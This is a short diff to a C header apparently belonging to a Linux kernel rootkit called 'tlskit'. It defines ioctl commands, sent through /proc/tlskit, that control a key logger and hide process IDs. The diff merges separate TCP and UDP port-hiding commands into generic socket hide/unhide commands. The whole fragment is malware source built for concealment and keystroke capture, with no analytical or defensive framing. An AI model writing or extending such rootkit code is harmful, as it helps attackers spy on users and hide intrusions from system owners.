@@ -17,10 +17,8 @@
 #define RKCTL_STOP_KEY_LOGGER _IO('@', 0x05)
 #define RKCTL_HIDE_PID_ADD _IOW('@', 0x6, pid_t)
 #define RKCTL_HIDE_PID_RM _IOW('@', 0x7, pid_t)
-#define RKCTL_UDP_HIDE _IOW('@', 0x8, unsigned short)
-#define RKCTL_UDP_UNHIDE _IOW('@', 0x9, unsigned short)
-#define RKCTL_TCP_HIDE _IOW('@', 0xa, unsigned short)
-#define RKCTL_TCP_UNHIDE _IOW('@', 0xb, unsigned short)
+#define RKCTL_HIDE_SOCKET _IOW('@', 0x8, unsigned short)
+#define RKCTL_UNHIDE_SOCKET _IOW('@', 0x9, unsigned short)
 
 #define PROC_ENTRY_NAME "tlskit"
 #define IOCTL_FILE_PATH "/proc/tlskit"
